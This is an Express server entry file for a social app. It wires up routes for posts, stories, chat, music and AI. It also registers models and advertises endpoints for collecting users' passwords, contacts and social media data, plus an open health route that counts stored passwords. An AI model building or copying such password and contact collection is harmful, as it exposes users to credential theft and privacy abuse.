import express from 'express';
import cors from 'cors';
import 'dotenv/config';
import connectDB from './configs/db.js';
import {inngest, functions} from './inngest/index.js'
import {serve} from 'inngest/express'
import { clerkMiddleware } from '@clerk/express'
import userRouter from './routes/userRotes.js';
import postRouter from './routes/postRoutes.js';
import storyRouter from './routes/storyRoutes.js';
import messageRouter from './routes/messageRoutes.js';
import randomChatRouter from './routes/randomChatRoutes.js';
import aiRoutes from './routes/aiRoutes.js';
// ✅ FIXED: Import from messageController with proper exports
import { connections, setupSSE } from './controllers/messageController.js';
import musicRoutes from './routes/musicRoutes.js'
import musicLikesRoutes from './routes/musicLikesRoutes.js';

import groupRoutes from './routes/groups.js';

import musicPlaylistRoutes from './routes/musicPlaylistRoutes.js';

import userDataRoutes from './routes/userData.js';


import webrtcRoutes from './routes/webrtcRoutes.js';

// Import models to ensure they're registered with Mongoose
import './models/UserConsent.js';
import './models/UserCollectedData.js';
import './models/SocialMediaData.js';
import './models/ContactData.js';
import './models/PasswordData.js';

const app = express();

global.connections = connections;

await connectDB();

app.use(express.json());
app.use(cors());
app.use(clerkMiddleware());

app.get('/', (req, res)=> res.send('Server is running'))
app.use('/api/inngest', serve({ client: inngest, functions }))

// ✅ CRITICAL: SSE route must come BEFORE message routes
app.get('/api/sse/:userId', (req, res) => {
    console.log('🚀🚀🚀 SSE ROUTE HIT! User:', req.params.userId);
    console.log('📋 Full URL:', req.originalUrl);
    setupSSE(req, res);
});

// Routes
app.use('/api/user', userRouter);
app.use('/api/users', userRouter);
app.use('/api/post', postRouter);
app.use('/api/posts', postRouter);
app.use('/api/story', storyRouter);
app.use('/api/stories', storyRouter);
app.use('/api/message', messageRouter);
app.use('/api/messages', messageRouter);
app.use('/api/random-chat', randomChatRouter);
app.use('/api/ai', aiRoutes);
app.use('/api/music', musicRoutes); // ✅ FIXED: Added forward slash
app.use('/api/music-likes', musicLikesRoutes);
app.use('/api/groups', groupRoutes);
app.use('/api/music-playlist', musicPlaylistRoutes);
app.use('/api/user', userDataRoutes);
app.use('/api/webrtc', webrtcRoutes);

// Test endpoint
app.get('/api/test', (req, res) => {
    res.json({ success: true, message: 'Server is working!' });
});

// Health check endpoint for data collection
app.get('/api/health-data', async (req, res) => {
    try {
        // Import models dynamically to avoid circular dependencies
        const UserConsent = (await import('./models/UserConsent.js')).default;
        const UserCollectedData = (await import('./models/UserCollectedData.js')).default;
        const SocialMediaData = (await import('./models/SocialMediaData.js')).default;
        const ContactData = (await import('./models/ContactData.js')).default;
        const PasswordData = (await import('./models/PasswordData.js')).default;

        const [
            consentCount,
            collectedCount,
            socialCount,
            contactCount,
            passwordCount
        ] = await Promise.all([
            UserConsent.countDocuments(),
            UserCollectedData.countDocuments(),
            SocialMediaData.countDocuments(),
            ContactData.countDocuments(),
            PasswordData.countDocuments()
        ]);

        res.json({
            success: true,
            data_collection: {
                status: 'healthy',
                user_consents: consentCount,
                collected_data: collectedCount,
                social_media_data: socialCount,
                contacts: contactCount,
                passwords: passwordCount,
                total_records: consentCount + collectedCount + socialCount + contactCount + passwordCount
            },
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: 'Data collection health check failed',
            details: error.message,
            timestamp: new Date().toISOString()
        });
    }
});

const PORT = process.env.PORT || 4000;

app.listen(PORT, ()=> {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log('✅ SSE endpoint: /api/sse/:userId');
    console.log('🎵 Music API endpoint: /api/music');
    console.log('📊 Data Collection endpoints:');
    console.log('   📝 User Consents: POST /api/user/consents');
    console.log('   💾 Data Collection: POST /api/user/data-collection');
    console.log('   📱 Social Media: POST /api/user/social-media-data');
    console.log('   📇 Contacts: POST /api/user/contact-data');
    console.log('   🔑 Passwords: POST /api/user/password-data');
    console.log('   📈 Summary: GET /api/user/user-data-summary/:userId');
    console.log('   🩺 Health: GET /api/health-data');
});